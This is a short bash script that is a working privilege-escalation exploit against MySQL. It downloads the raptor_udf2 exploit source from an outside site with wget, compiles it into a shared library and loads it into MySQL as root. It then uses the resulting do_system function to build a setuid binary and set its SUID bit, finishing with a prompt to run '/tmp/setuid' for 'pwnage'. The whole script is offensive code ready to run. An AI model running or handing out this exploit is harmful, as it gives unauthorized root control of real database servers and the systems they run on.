#!/bin/bash

echo "[- Downloading raptor_udf2.so from 0xdeadbeef..."
wget -q http://0xdeadbeef.info/exploits/raptor_udf2.c
echo "[- Compiling..."
gcc -g -c raptor_udf2.c
gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
echo "[- Source compiled, shared object created."
echo "[- Attempting to create system execution UDF..."
mysql -u root << EOF
use mysql;
create table pwn(line blob);
insert into pwn values(load_file('/home/centos/raptor_udf2.so'));
select * from pwn into dumpfile '/usr/lib/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select * from mysql.func;
select do_system('gcc -o /tmp/setuid /home/centos/setuid.c');
select do_system('chmod u+s /tmp/setuid');
EOF
echo "[- UDF created! setuid.c has been compiled, SUID bit set via do_system() as root user."
echo "[- Run '/tmp/setuid' for pwnage. :)"
